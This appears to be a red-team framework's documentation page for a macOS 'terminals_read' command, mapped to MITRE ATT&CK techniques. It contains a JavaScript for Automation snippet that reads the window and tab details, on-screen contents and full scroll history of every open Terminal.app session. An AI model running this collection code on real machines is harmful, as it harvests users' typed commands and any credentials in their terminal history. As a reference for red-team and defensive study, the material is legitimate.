+++
title = "terminals_read"
chapter = false
weight = 100
hidden = false
+++

## Summary

This uses AppleEvents to read information about open instances of Apple's Terminal.app. 

The contents flag allows you to see exactly what the user can see at that moment on the screen. 

The history flag allows you to see everything that's in that tab's scroll history. This can be a lot of information, so keep that in mind. 

This function will also give you the window/tab information for each open session and a bunch of other information.
     
- Needs Admin: False  
- Version: 1  
- Author: @its_a_feature_  

### Arguments

#### level

- Description: How much data to retrive - what's viewable or all history  
- Required Value: True  
- Default Value: None  

## Usage

```
terminals_read
```

## MITRE ATT&CK Mapping

- T1139  
- T1056  
## Detailed Summary
This sends AppleEvents to the Terminal.app to read information about the windows/tabs:
```JavaScript
let term = Application("Terminal");
if(term.running()){
    let windows = term.windows;
    for(let i = 0; i < windows.length; i++){
        let win_info = {
            "Name": windows[i].name(),
            "Visible": windows[i].visible(),
            "Frontmost": windows[i].frontmost(),
            "tabs": []
        };
        let all_tabs = [];
        // store the windows information in id_win in all_data
        all_data["window_" + i] = win_info;
        for(let j = 0; j < windows[i].tabs.length; j++){
            let tab_info = {
                "tab": j,
                "Busy": windows[i].tabs[j].busy(),
                "Processes": windows[i].tabs[j].processes(),
                "Selected": windows[i].tabs[j].selected(),
                "TTY": windows[i].tabs[j].tty()
            };
            if(windows[i].tabs[j].titleDisplaysCustomTitle()){
                tab_info["CustomTitle"] =  windows[i].tabs[j].customTitle();
            }
            if(split_params['level'] === 'history'){
                tab_info["History"] = windows[i].tabs[j].history();
            }
            if(split_params['level'] === 'contents'){
                tab_info["Contents"] = windows[i].tabs[j].contents();
            }
            all_tabs.push(tab_info);
        }
        // store all of the tab information corresponding to that window id at id_tabs
        win_info['tabs'] = all_tabs;
    }
```
